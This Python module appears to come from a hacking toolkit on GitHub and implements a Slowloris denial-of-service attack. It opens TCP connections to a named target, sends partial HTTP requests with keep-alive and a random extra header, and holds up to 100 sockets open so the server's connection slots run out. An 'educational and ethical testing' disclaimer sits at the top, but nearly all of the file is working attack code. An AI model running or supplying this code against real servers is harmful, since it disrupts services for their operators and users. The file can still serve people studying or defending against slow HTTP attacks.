#!/usr/bin/env python3
"""
🐌 Slowloris Attack Module
Created By: Rajsaraswati Jatav
GitHub: https://github.com/RAJSARASWATI-JATAV

⚠️ FOR EDUCATIONAL AND ETHICAL TESTING PURPOSES ONLY ⚠️
"""

import socket
import random
import time
from colorama import Fore, Style

class Slowloris:
    """Slowloris Attack Implementation"""
    
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.connections = []
        
    def execute_attack(self):
        """Execute Slowloris attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            sock.connect((self.target, self.port))
            
            request = f"GET /{random.randint(1,10000)} HTTP/1.1\r\n"
            request += f"Host: {self.target}\r\n"
            request += f"User-Agent: Mozilla/5.0 (SlowHTTPTest)\r\n"
            request += f"Connection: keep-alive\r\n"
            
            sock.send(request.encode())
            
            header = f"X-Custom-Header-{random.randint(1,1000)}: {random.randint(1,1000)}\r\n"
            sock.send(header.encode())
            
            self.connections.append(sock)
            
            if len(self.connections) > 100:
                old_sock = self.connections.pop(0)
                try:
                    old_sock.close()
                except:
                    pass
            
            return True
        except Exception:
            return False
    
    def get_info(self):
        return {
            'name': 'Slowloris',
            'description': 'Low-bandwidth application layer attacks',
            'target': self.target,
            'port': self.port,
            'method': 'Slow HTTP request to exhaust server connections'
        }